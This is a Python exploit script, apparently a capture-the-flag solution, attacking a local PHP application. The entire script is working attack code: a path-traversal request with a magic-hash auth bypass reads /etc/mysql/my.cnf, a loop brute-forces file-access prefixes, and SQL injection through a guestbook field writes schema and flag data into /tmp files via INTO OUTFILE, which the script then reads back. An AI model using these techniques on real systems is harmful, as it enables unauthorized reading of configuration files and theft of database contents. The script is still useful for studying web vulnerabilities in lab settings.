import requests
import hashlib
import json
candidate = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
pow_cand = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$"
cookie = {"PHPSESSID": "4qbbf2fngfb2bb2qthj2hjb20n"}

HOST = "127.0.0.1:8081"

def run(prefix, arb):
    r = requests.get("http://%s/read.php?book=:%s:..:%s&auth=0e1" % (HOST, prefix, arb), cookies = cookie)
    return r.text

def find(arb):
    for i in candidate:
        for j in candidate:
                x = i+j
                r = run(x, arb)
                if not "authcode" in r:
                    return x
        print("finding at %s" % i)
    return ""

def readFile(prefix, arb):
    r = run(prefix, arb)
    r = json.loads(r)
    return r["body"]

def pow(answer):
    for i in pow_cand:
        for j in pow_cand:
            for k in pow_cand:
                for l in pow_cand:
                    x = hashlib.sha1((i+j+k+l).encode()).hexdigest()
                    if x[:5] == answer:
                        print("%s => %s" % (i+j+k+l, x))
                        return i+j+k+l
#Stage 1 : Find a way to read /etc/mysql/my.cnf
x = 'rH' #find("etc:mysql:my.cnf") => 'rH'
print(readFile(x, "etc:mysql:my.cnf"))

#Stage 2 : Find three temporal file that we can access
t1 = 'nn' #find("tmp:payload_xxx1") => 'nn'
t2 = 'Hq' #find("tmp:payload_xxx2") => 'Hq'
t3 = 'KJ' #find("tmp:payload_xxx3") => 'KJ'
print(t1, t2, t3)

#Stage 3 : SQL injection to get information_schema
#Find table named 'flag'
answer = input("\nPoW answer > ")
r = requests.post("http://%s/guestbook.php" % (HOST), cookies = cookie, data = {
    "column": "table_name` from information_schema.tables into outfile '/tmp/payload_xxx1' -- ",
    "value": "CODE",
    "pow": pow(answer)
    })
print(r.text)
print(readFile(t1, "tmp:payload_xxx1"))

#Find columname of `flag`
answer = input("\nPow answer > ")
r = requests.post("http://%s/guestbook.php" % (HOST), cookies = cookie, data = {
    "column": "column_name` from information_schema.columns into outfile '/tmp/payload_xxx2' -- ",
    "value": "CODE",
    "pow": pow(answer)
    })
print(r.text)
print(readFile(t2, "tmp:payload_xxx2"))


#Read flag.flag is enough
answer = input("\nPow answer > ")
r = requests.post("http://%s/guestbook.php" % (HOST), cookies = cookie, data = {
    "column": "flag` from flag into outfile '/tmp/payload_xxx3' -- ",
    "value": "CODE",
    "pow": pow(answer)
    })
print(r.text)
print(readFile(t3, "tmp:payload_xxx3"))



